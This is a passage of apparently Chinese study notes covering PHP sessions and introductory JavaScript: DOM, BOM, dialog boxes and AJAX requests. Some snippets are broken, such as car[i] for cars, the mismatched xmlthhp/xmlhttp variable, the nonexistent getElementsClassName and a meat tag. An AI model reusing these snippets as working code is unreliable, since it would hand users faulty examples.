Session</h3><p>（1）若需要删除某些session数据，可以使用unset()或session_destroy()函数</p><ul><li>unset()函数用于释放指定的session变量</li></ul><pre><code class="php">&lt;?php    unset($_SESSION[&#39;views&#39;])；?&gt;</code></pre><p>（2）可以通过session_destroy()函数彻底终结session</p><ul><li>session_destroy()将重置session，将失去所有已存储的session数据</li></ul><pre><code class="php">&lt;?php    session_destroy();?&gt;</code></pre><h3 id="利用session进行权限管理"><a href="#利用session进行权限管理" class="headerlink" title="利用session进行权限管理"></a>利用session进行权限管理</h3><p>当用户需要访问登录后的页面或特定身份才能访问的页面或数据，则通过session变量来校验用户身份权限和状态，根据校验结果决定是否允许用户进行相关操作。</p><ul><li>用户登录成功时为用户分配session变量</li><li>记录用户的登录状态和身份</li></ul><p><img src="https://i.loli.net/2021/03/18/8khDnLWJTZ5cmC7.png" alt="image-20210318203458759"></p><h3 id="header-函数"><a href="#header-函数" class="headerlink" title="header()函数"></a>header()函数</h3><p>header()函数是PHP中进行页面跳转的一种方法。</p><ul><li>header()函数的主要功能是将HTTP协议标头(header)输出到浏览器。</li></ul><pre><code class="php">&lt;?php    header(&quot;Location:http://www.qq.com&quot;);   //重定向浏览器    exit();   //确保重定向后，后续代码不会被执行?&gt;</code></pre><h3 id="die-函数"><a href="#die-函数" class="headerlink" title="die()函数"></a>die()函数</h3><p>die()函数执行后，将不再执行后面的所有php代码。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全进阶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript代码进阶</title>
      <link href="2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/"/>
      <url>2021/03/16/%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/JavaScript%E4%BB%A3%E7%A0%81%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScript简介"><a href="#JavaScript简介" class="headerlink" title="JavaScript简介"></a>JavaScript简介</h2><p>（1）JavaScript是web浏览器的语言，一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。</p><p>（2）它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言。最早是在HTML网页上使用，用来给HTML网页增加动态功能。</p><p>（3）JavaScript基本特点：</p><ul><li>脚本编写语言</li><li>基于对象的语言</li><li>简单性</li><li>安全性</li><li>动态性</li><li>跨平台性</li></ul><h2 id="JavaScript的基本语法"><a href="#JavaScript的基本语法" class="headerlink" title="JavaScript的基本语法"></a>JavaScript的基本语法</h2><p>（1）JavaScript中的脚本必须位于&lt;script&gt;与&lt;/script&gt;标签之间。浏览器的控制台可以执行js代码。</p><pre><code class="javascript">&lt;script type=&quot;text/javascript&quot; src=&quot;&quot;&gt;&lt;/script&gt;//外部引入js代码，src为资源路径</code></pre><p>（2）脚本可被放置在HTML页面的&lt;body&gt;和&lt;head&gt;部分中。</p><pre><code class="html">&lt;!doctype html&gt;&lt;html&gt;    &lt;body&gt;        &lt;script&gt;            document.write(&quot;&lt;h1&gt;this is a heading&lt;/h1&gt;&quot;);            document.write(&quot;&lt;p&gt;this is a paragraph&lt;/p&gt;&quot;);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（3）JavaScript的注释：</p><ul><li>单行注释：//</li></ul><pre><code class="javascript">&lt;script&gt;    //这表示单行注释，不会在页面中被显示    alert(&quot;my first javascript&quot;);&lt;/script&gt;</code></pre><ul><li>多行注释：/*在此写注释 */</li></ul><pre><code class="javascript">&lt;script&gt;    /*这表示多行注释，    不会在页面中被显示*/    alert(&quot;my first javascript&quot;);&lt;/script&gt;</code></pre><h3 id="JavaScript变量"><a href="#JavaScript变量" class="headerlink" title="JavaScript变量"></a>JavaScript变量</h3><p>（1）变量是存储信息的容器；typeof(a)，打印a的类型</p><pre><code class="javascript">var x=2;var y=3;var z=x+y;</code></pre><p>（2）声明（创建）JavaScript变量</p><ul><li>方法一：创建变量，为变量赋值；</li></ul><pre><code class="javascript">var carname;carname=&quot;Volvo&quot;;</code></pre><ul><li>方法二：创建变量的同时并为变量赋值；</li></ul><pre><code class="javascript">var carname=&quot;Volvo&quot;;</code></pre><p>（3）一条语句，多个变量：在一条语句中声明多个变量。语句使用var开头，使用逗号分隔变量；</p><pre><code class="javascript">var name=&quot;Gates&quot;,age=56,job=&quot;CEO&quot;;</code></pre><p>（4）横跨多行声明</p><pre><code class="javascript">var name=&quot;Gates&quot;,    age=56,    job=&quot;CEO&quot;;</code></pre><p>（5）无值变量：只声明了变量，但未为变量赋值，值=undefined</p><pre><code class="javascript">var carname;</code></pre><p>（6）重新声明变量：重新声明变量只要未重新赋值，变量原有的值不变，若重新赋值，则该变量的原有值被覆盖。</p><pre><code class="javascript">var carname=&quot;Volvo&quot;; var carname;</code></pre><h3 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h3><p>（1）局部变量：在JavaScript函数内部声明的变量（使用var）是局部变量，所以只能在函数内部访问它。（该变量的作用域是局部的）。可以在不同的函数中使用名称相同的局部变量，因为只有声明过该变量的函数才能识别出该变量。只要函数运行完毕，本地变量就会被删除。</p><p>（2）全局变量：在函数外声明的变量是全局变量，网页上的所有脚本和函数都能访问它。全局变量会在页面关闭后被删除。</p><p>（3）把值赋给尚未声明的变量，该变量将被自动作为全局变量声明。</p><h3 id="JavaScript的基本数据类型"><a href="#JavaScript的基本数据类型" class="headerlink" title="JavaScript的基本数据类型"></a>JavaScript的基本数据类型</h3><p>（1）三种基本的数据类型：</p><ul><li>数值（整数和实数）</li><li>字符串型（用’’或””括起来的字符或数值）</li><li>布尔型（使用True或False表示）</li></ul><p>（2）常量：</p><ul><li>整型常量</li><li>实型常量</li><li>布尔值</li><li>字符型常量</li><li>空值</li></ul><p>（3）变量：由开发人员自行定义</p><p>（4）JavaScript拥有动态类型，相同的变量可用作不同的类型</p><pre><code class="javascript">var x; //x为undefinedvar x = 6; //x为数字var x = &quot;Bill&quot;; //x为字符串</code></pre><p>（5）JavaScript字符串，可以使用单引号或双引号引用任意文本</p><pre><code class="javascript">var carname=&quot;Bill Gates&quot;;var carname=&#39;Bill Gates&#39;;</code></pre><p>（6）JavaScript字符串，允许在字符串中使用引号，只要不匹配字符中的引号即可</p><pre><code class="javascript">var answer=&quot;He is called &#39;Bill&#39;&quot;;var answer=&#39;He is called &quot;Bill&quot;&#39;;var answer=&quot;&quot;\&#39;\&quot;Bill&quot;&#39;&quot;&quot;   //其中\表示转义符，结果为var answer=\\\&#39;        //结果为\&#39;var a=&#39;&quot;&#39;;var b=&quot;&#39;&quot;;var c=&quot;&lt;div&gt;&quot;;var d= a+b+c+b+a      //用加号作为连接符，结果为&quot;&#39;&lt;div&gt;&#39;&quot;var e=1+2          //结果e为3var f=1+&quot;2&quot;        //结果f为12var g=1+&quot;&quot;         //结果g为1，但typeof(g)为string</code></pre><p>（7）JavaScript数字：JavaScript只有一种数字类型，数字可以带小数点，也可以不带</p><pre><code class="javascript">var x1=34.00;var x2=34;</code></pre><p>（8）极大或极小的数字可以通过科学（指数）计数法书写</p><pre><code class="javascript">var x=123e5;  //12300000var y=123e-5; //0.00123</code></pre><p>（9）JavaScript布尔，布尔（逻辑）只能有两个值：true或false</p><pre><code class="javascript">var x=truevar y=false</code></pre><h3 id="JavaScript函数"><a href="#JavaScript函数" class="headerlink" title="JavaScript函数"></a>JavaScript函数</h3><p>（1）JavaScript函数语法。</p><ul><li>函数就是包裹在花括号中的代码块，前面使用了关键词function：</li></ul><pre><code class="JavaScript">function functionname()&#123;    这里是要执行的代码&#125;</code></pre><ul><li>调用带参数的函数，可以向其传递值，这些值被称为参数。</li></ul><pre><code class="javascript">myFunction(argument1,argument2)</code></pre><ul><li>当声明函数时，需要把参数作为变量来声明：</li></ul><pre><code class="JavaScript">function myFunction(var1,var2)&#123;    这里是要执行的代码&#125;</code></pre><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;          请点击其中的一个按钮，来调用带参数的函数。          &lt;/p&gt;        &lt;button onclick=&quot;myFunction(&#39;Harry Potter&#39;,&#39;Wizard&#39;)&quot;&gt;            点击这里        &lt;/button&gt;        &lt;button onclick=&quot;myFunction(&#39;Bob&#39;,&#39;Builder&#39;)&quot;&gt;            点击这里        &lt;/button&gt;        &lt;script&gt;            function myFunction(name,job)&#123;                alert(&quot;Welcome &quot;+name+&quot;,the &quot;+job);            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（2）使用函数将 值返回调用它的地方，通过使用return语句就可以实现，在使用return语句时，函数会停止执行，并返回指定的值。</p><pre><code class="javascript">//带有返回值的函数语法function myFunction()&#123;var x=5;return x;&#125;</code></pre><p>注意：整个JavaScript并不会停止执行，仅仅是函数。JavaScript将继续从调用函数的地方执行代码。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;            本例调用的函数会执行一个计算，然后返回结果：        &lt;/p&gt;        &lt;p id=&quot;demo&quot;&gt;        &lt;/p&gt;        &lt;script&gt;            function myFunction(a,b)&#123;                return a*b;            &#125;            document.getElementById(&quot;demo&quot;).innerHTML=myFunction(4,3);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="JavaScript运算符"><a href="#JavaScript运算符" class="headerlink" title="JavaScript运算符"></a>JavaScript运算符</h3><h4 id="算术运算符与赋值运算符"><a href="#算术运算符与赋值运算符" class="headerlink" title="算术运算符与赋值运算符"></a>算术运算符与赋值运算符</h4><p>算术运算符用于执行变量或值之间的算术运算，赋值运算符用于给JavaScript变量赋值</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加</td></tr><tr><td align="center">-</td><td align="center">减</td></tr><tr><td align="center">*</td><td align="center">乘</td></tr><tr><td align="center">/</td><td align="center">除</td></tr><tr><td align="center">%</td><td align="center">取余（保留整数）</td></tr><tr><td align="center">++</td><td align="center">累加（x=++5，x=6）</td></tr><tr><td align="center">–</td><td align="center">递减（x=–5，x=4）</td></tr><tr><td align="center">=</td><td align="center">赋值x=y</td></tr><tr><td align="center">+=</td><td align="center">x+=y等价于x=x+y</td></tr><tr><td align="center">-=</td><td align="center">x-=y等价于x=x-y</td></tr><tr><td align="center">*=</td><td align="center">x*=y等价于x=x*y</td></tr><tr><td align="center">/=</td><td align="center">x/=y等价于x=x/y</td></tr><tr><td align="center">%=</td><td align="center">x%=y等价于x=x%y</td></tr></tbody></table><h4 id="比较和逻辑运算符"><a href="#比较和逻辑运算符" class="headerlink" title="比较和逻辑运算符"></a>比较和逻辑运算符</h4><p>（1）比较运算符在逻辑语句中使用，以测定变量或值是否相等</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">例子</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td><td align="center">5==8为false</td></tr><tr><td align="center">===</td><td align="center">全等(值和类型都要相等)</td><td align="center">5===5为true，5===”5”为false</td></tr><tr><td align="center">!=</td><td align="center">不等于</td><td align="center">5!=8为true</td></tr><tr><td align="center">&gt;</td><td align="center">大于</td><td align="center"></td></tr><tr><td align="center">&lt;</td><td align="center">小于</td><td align="center"></td></tr><tr><td align="center">&gt;=</td><td align="center">大于等于</td><td align="center"></td></tr><tr><td align="center">&lt;=</td><td align="center">小于等于</td><td align="center"></td></tr></tbody></table><p>（2）逻辑运算符用于测定变量或值之间的逻辑</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&amp;&amp;</td><td align="center">and</td></tr><tr><td align="center">||</td><td align="center">or</td></tr><tr><td align="center">!</td><td align="center">not</td></tr></tbody></table><h3 id="javascript条件语句"><a href="#javascript条件语句" class="headerlink" title="javascript条件语句"></a>javascript条件语句</h3><p>（1）if语句：只有当指定条件为true时，执行该条件下的代码</p><p>（2）if…else语句：当条件为true时执行if下的代码，当条件为false时执行else下的代码</p><p>（3）if…else if…else：使用该语句来选择多个代码块之一来执行</p><p>（4）switch语句：使用该语句来选择多个代码块之一来执行</p><h3 id="JavaScript循环语句"><a href="#JavaScript循环语句" class="headerlink" title="JavaScript循环语句"></a>JavaScript循环语句</h3><p>（1）for语句：</p><pre><code>for(语句1;语句2;语句3)&#123;    被执行的代码块&#125;</code></pre><ul><li>语句1在循环开始前执行(可选)</li><li>语句2定义循环的条件(可选)</li><li>语句3在循环已被执行后执行(可选)</li></ul><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;script&gt;            cars=[&quot;BMW&quot;,&quot;Volvo&quot;,&quot;Ford&quot;];            for(var i=0;i&lt;cars.length;i++)&#123;                document.write(car[i]+&quot;&lt;br&gt;&quot;);            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（2）while语句</p><pre><code>while(条件)&#123;需要执行的代码&#125;例如：while(i&lt;5)&#123;x=x+&quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;i++;&#125;</code></pre><p>（3）do…while语句</p><pre><code>do&#123;需要执行的代码&#125;while(条件)</code></pre><h3 id="break和continue语句"><a href="#break和continue语句" class="headerlink" title="break和continue语句"></a>break和continue语句</h3><p>（1）break语句：用于跳出当前循环，跳出循环后会继续执行该循环之后的代码。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;            点击按钮，测试带有break语句的循环        &lt;/p&gt;        &lt;button onclick=&quot;myFunction()&quot;&gt;            点击这里        &lt;/button&gt;        &lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;        &lt;script&gt;            function myFunction()&#123;                var x=&quot;&quot;,i=0;                for(i=0;i&lt;10;i++)&#123;                    if(i==3)&#123;                        break;                    &#125;                    x=x + &quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;                &#125;                document.getElementById(&quot;demo&quot;).innerHTML=x;            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>（2）continue语句：中断循环中的迭代，若出现了指定的条件，然后继续循环中的下一个迭代。</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;body&gt;        &lt;p&gt;            点击按钮执行循环，循环会跳过i=3的步骤        &lt;/p&gt;        &lt;button onclick=&quot;myFunction()&quot;&gt;            点击这里        &lt;/button&gt;        &lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;        &lt;script&gt;            function myFunction()&#123;                var x=&quot;&quot;,i=0;                for(i=0;i&lt;10;i++)&#123;                    if(i==3)&#123;                        continue;                    &#125;                    x=x + &quot;The number is &quot;+i+&quot;&lt;br&gt;&quot;;                &#125;                document.getElementById(&quot;demo&quot;).innerHTML=x;            &#125;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="JavaScript-DOM"><a href="#JavaScript-DOM" class="headerlink" title="JavaScript DOM"></a>JavaScript DOM</h2><p>（1）HTML DOM（文档对象模型）。对当前超文本进行操作的技术。当网页被加载时，浏览器会创建页面的文档对象模型，HTML DOM模型被构造为对象的树。</p><p>（2）通过可编程的对象模型，JavaScript获得了足够的能力来创建动态的HTML。</p><ul><li>JavaScript能够改变页面中的所有HTML元素</li><li>JavaScript能够改变页面中的所有HTML属性</li><li>JavaScript能够改变页面中的所有CSS样式</li><li>JavaScript能够对页面中的所有事件作出反应</li></ul><p>（3）通常要使用JavaScript操作HTML元素，就需要找到相应的元素，可通过如下的方法找到元素：</p><ul><li>通过id找到HTML元素</li><li>通过标签名找到HTML元素</li><li>通过类名找到HTML元素</li></ul><p>（4）DOM可以获取网站的cookie。在浏览器中使用快捷键F12进入控制台(console)，输入document.cookie就能获取当前网站的cookie。</p><p><img src="https://i.loli.net/2021/03/16/acUeO5FTR7PVQX8.png" alt="image-20210316181503816"></p><p>（5）DOM可以获取URL的数据，在控制台输入window.location就可获取到浏览器的URL数据</p><p><img src="https://i.loli.net/2021/03/16/PhWa3QA9vnIHszN.png" alt="image-20210316181801514"></p><h3 id="获取标签–基于id"><a href="#获取标签–基于id" class="headerlink" title="获取标签–基于id"></a>获取标签–基于id</h3><p>在使用JavaScript操作HTML元素，就需要找到相应的元素，可通过id获取元素</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meat charset=&quot;UTF-8&quot;&gt;&lt;/meat&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1 id=&quot;demo&quot;&gt;welcome to gok&lt;/h1&gt;        &lt;script&gt;            var a=document.getElementById(&quot;demo&quot;);            document.write(&quot;这是基于Id抓取到的内容：&quot;+a.innerHTML);   //document基于DOM技术，用到某一个方法要加上一个点.如getElementById函数，表示通过id找到一个标签。innerHTML可修改元素内容。window是基于BOM技术        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/16/UXLgYtdNaQ9b8AE.png" alt="image-20210316183426660"></p><pre><code class="html">&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;script&gt;        function test()&#123;            document.getElementById(&quot;1&quot;).value=&quot;文本文档1&quot;; //找到id对应的标签后再用value方法修改改标签的值。            document.getElementById(&quot;2&quot;).value=&quot;文本文档2&quot;;            document.getElementById(&quot;3&quot;).href=&quot;http://www.goktech.cn&quot;;//找到id对应的标签后用href方法修改原a标签的值。        &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;1&quot; onclick=&quot;test()&quot;&gt;  //用onclick调用test函数    &lt;input type=&quot;text&quot; name=&quot;&quot; id=&quot;2&quot; onclick=&quot;test()&quot;&gt;    &lt;a href=&quot;www.baidu.com&quot; id=&quot;3&quot; onclick=&quot;test()&quot;&gt;百度&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/23/PA4lhXvJHSTzKNu.png" alt="image-20210323212113175"></p><p><img src="https://i.loli.net/2021/03/23/kMUy4m59fQAOZY8.png" alt="image-20210323212208821"></p><p><img src="https://i.loli.net/2021/03/23/uTtJAC1yasGLEgf.png" alt="image-20210323212231314"></p><h3 id="获取标签-–基于class"><a href="#获取标签-–基于class" class="headerlink" title="获取标签 –基于class"></a>获取标签 –基于class</h3><pre><code class="javascript">document.getElementsClassName(&quot;&quot;)[0]   //由于类并不唯一，所以可以在末尾加上[0]代表要取第一个标签</code></pre><h3 id="获取标签–基于Tagname"><a href="#获取标签–基于Tagname" class="headerlink" title="获取标签–基于Tagname"></a>获取标签–基于Tagname</h3><p>通过TagName获取元素；</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/meta&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;welcome to gok!&lt;/h1&gt;        &lt;h1&gt;Javascript DOM&lt;/h1&gt;        &lt;script&gt;            var b=document.getElementsByTagName(&quot;h1&quot;);            document.write(&quot;这是基于TagName抓取到的内容：&quot;+b[0].innerHTML);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="获取标签–基于Div"><a href="#获取标签–基于Div" class="headerlink" title="获取标签–基于Div"></a>获取标签–基于Div</h3><p>通过Div获取元素</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/meta&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div id=&quot;demo&quot;&gt;            &lt;h1&gt;welcome to gok!&lt;/h1&gt;            &lt;h1&gt;Javascript DOM&lt;/h1&gt;        &lt;/div&gt;        &lt;script&gt;            var a=document.getElementById(&quot;demo&quot;);            var b=document.getElementsByTagName(&quot;h1&quot;);            document.write(&quot;这是基于Div抓取到的内容：&quot;+b[0].innerHTML);        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="Javascript-BOM"><a href="#Javascript-BOM" class="headerlink" title="Javascript BOM"></a>Javascript BOM</h2><p>（1）BOM(Browser Object Model)，浏览器对象模型，对浏览器进行操作。它使JavaScript有能力与浏览器”对话“</p><p>（2）所有浏览器都支持window对象。它表示浏览器窗口。</p><ul><li>所有JavaScript全局对象、函数以及变量均自动成为window对象的成员。</li><li>全局变量是window对象的属性。</li><li>全局函数是window对象的方法。</li></ul><p>（3）window.open()   ——-打开新窗口。window.close()  ——-关闭当前窗口。 window.location.href —-页面跳转。</p><h3 id="BOM-window-open"><a href="#BOM-window-open" class="headerlink" title="BOM-window.open"></a>BOM-window.open</h3><p>window.open()实现的功能是打开一个新窗口，通过设置一个按钮，利用window.open()可以实现当点击按钮的时候，会打开一个新的页面(如例中的<a href="http://www.goktech.cn)，代码及现象如图：">http://www.goktech.cn)，代码及现象如图：</a></p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;script&gt;            function win_open()&#123;                window.open(&quot;http://www.goktech.cn&quot;)            &#125;        &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;button&quot; value=&quot;Open Window&quot; onclick=&quot;win_open()&quot;/&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/16/BwrX6UfFc4VMtxq.png" alt="image-20210316224229904"></p><p><img src="https://i.loli.net/2021/03/16/suMivCgGxBAjZFD.png" alt="image-20210316224252251"></p><h3 id="BOM-window-close"><a href="#BOM-window-close" class="headerlink" title="BOM-window.close"></a>BOM-window.close</h3><p>window.close()实现的功能是<strong>关闭当前窗口</strong>，在本例中预先设置执行代码后会弹出一个新窗口，当点击设置的按钮后，此新窗口会被关闭，代码及现象如图：</p><pre><code class="html">&lt;html&gt;    &lt;head&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            function Winclose()&#123;                myWindow.close()            &#125;                &lt;/script&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;button&quot; value=&quot;Close myWindow&quot; onclick=&quot;Winclose()&quot;/&gt;        &lt;script type=&quot;text/javascript&quot;&gt;            myWindow=window.open(&#39;&#39;,&#39;&#39;,&#39;width=200,height=100&#39;)            myWindow.document.write(&quot;这是一个示例窗口&quot;)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/PfxMvwjTXaOmSqb.png" alt="image-20210317145808454"></p><h3 id="Bom-window-location-href"><a href="#Bom-window-location-href" class="headerlink" title="Bom-window.location.href"></a>Bom-window.location.href</h3><p>（1）window.location可以查看当前网页的属性。</p><p>（2）window.location.href()是修改当前网页的href属性，实现的功能是页面跳转，利用window.location.href()设置一个想要跳转的页面，当执行代码时就会跳转到相应的位置，代码及现象如下：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Goktech.javascript&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;script&gt;        window.location.href=&#39;http://www.goktech.cn&#39;    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/AlFSoMRB8nvUTuZ.png" alt="image-20210317150437014"></p><h3 id="BOM-消息框-alert"><a href="#BOM-消息框-alert" class="headerlink" title="BOM-消息框-alert"></a>BOM-消息框-alert</h3><p>alert(“文本”)：显示带有一段消息和一个确认按钮的警告框</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UFT-8&quot;&gt;        &lt;title&gt;Goktech.javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(alert)&quot; onclick=&quot;alert(&#39;这是由alert形成的弹框&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/4cmGoHKRihvekpQ.png" alt="image-20210317151009427"></p><h3 id="BOM-消息框-confirm"><a href="#BOM-消息框-confirm" class="headerlink" title="BOM-消息框-confirm"></a>BOM-消息框-confirm</h3><p>confirm(“文本”)：显示带有一段消息以及确认按钮和取消按钮的对话框</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;Goktech.javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(confirm)&quot; onclick=&quot;confirm(&#39;这是由confirm形成的弹框&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/w1kCMUD9ENZ4hma.png" alt="image-20210317151545748"></p><h3 id="BOM-消息框-prompt"><a href="#BOM-消息框-prompt" class="headerlink" title="BOM-消息框-prompt"></a>BOM-消息框-prompt</h3><p>prompt(“文本”)：显示可提示用户输入的对话框</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;Goktech-javascript&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;input type=&quot;submit&quot; value=&quot;点击此按钮(prompt)&quot; onclick=&quot;prompt(&#39;这是由prompt形成的弹框&#39;)&quot;&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="https://i.loli.net/2021/03/17/3GV4TCYS8IwcXoz.png" alt="image-20210317152036718"></p><p>扩展：jQuery是一个JavaScript库，极大简化了JavaScript。</p><pre><code>&lt;script src=&quot;jquery-3.4.1.js&quot;&gt;&lt;/script&gt;function Jquery_Test()&#123;    $(&quot;p&quot;)    //定位到p标签    $(&quot;#p1&quot;).html(&quot;test&quot;)   //找到到id为p1的元素，给它添加元素    $(&quot;#input1&quot;).val(&quot;123&quot;)&#125;</code></pre><h2 id="AJAX的基本语法及应用"><a href="#AJAX的基本语法及应用" class="headerlink" title="AJAX的基本语法及应用"></a>AJAX的基本语法及应用</h2><p>（1）AJAX=Asynchronous JavScript and XML（异步的JavaScript和XML）</p><p>（2）AJAX是一种用于创建快速动态网页的技术。AJAX不是一种新的语言，而是一种新的标准方法；</p><p>（3）传统的网页（不使用AJAX）如果需要更新内容，必须重载整个网页。AJAX技术通过在后台与服务器进行少量数据交换，AJAX可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p><p>（4）使用AJAX的应用程序案例：新浪微博、Google地图、开心网等等。</p><p>HTML – AJAX – 访问服务器的某个页面 – 数据库</p><h3 id="AJAX请求方法"><a href="#AJAX请求方法" class="headerlink" title="AJAX请求方法"></a>AJAX请求方法</h3><p>如需将请求发送到服务器，使用XMLHttpRequest类的open()和send()方法；</p><pre><code class="javascript">xmlhttp.open(&quot;GET&quot;,&quot;test1.txt&quot;,true);xmlhttp.send();</code></pre><table><thead><tr><th align="left">open(method,url,async)</th><th align="left">规定请求的类型、URL以及是否异步处理请求。                                                                                         (1)method：请求的类型GET或POST                                                                                (2)url：文件在服务器上的位置                                                                                             (3)async：true（异步）或false（同步）</th></tr></thead><tbody><tr><td align="left">send(string)</td><td align="left">将请求发送到服务器。                                                                                                            *string：仅用于POST请求</td></tr></tbody></table><h3 id="请求实现-get请求"><a href="#请求实现-get请求" class="headerlink" title="请求实现-get请求"></a>请求实现-get请求</h3><p>（1）一个简单的GET请求：</p><pre><code>var xmlthhp = new XMLHttpRequest   //创建的xmlthhp是XMLHttpRequest类的对象xmlhttp.open(&quot;GET&quot;,&quot;demo_get.asp&quot;,true);xmlhttp.send();</code></pre><p>（2）通过GET方法发送信息，请向URL添加信息：</p><pre><code>xmlhttp.open(&quot;GET&quot;,&quot;demo_get2.asp?fname=Bill&amp;lname=Gates&quot;,true);xmlhttp.send();</code></pre><p>（3）AJAX请求代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;    function loadXMLDoc()&#123;        var xmlhttp;        if (window.XMLHttpRequest)&#123;            xmlhttp=new XMLHttpRequest();        &#125;        else&#123;            xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);        &#125;        xmlhttp.onreadystatechange=function()&#123;            if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)&#123;                document.getElementById(&quot;myDiv&quot;).innerHTML=xmlhttp.responseText;            &#125;        &#125;        xmlhttp.open(&quot;GET&quot;,&quot;/ajax/demo_get2.asp?fname=Bill&amp;name=Gates&quot;,true);        xmlhttp.send();    &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;h2&gt;AJAX&lt;/h2&gt;    &lt;button type=&quot;button&quot; onclick=&quot;loadXMLDoc()&quot;&gt;请求数据&lt;/button&gt;    &lt;div id=&quot;myDiv&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="请求实现-POST请求"><a href="#请求实现-POST请求" class="headerlink" 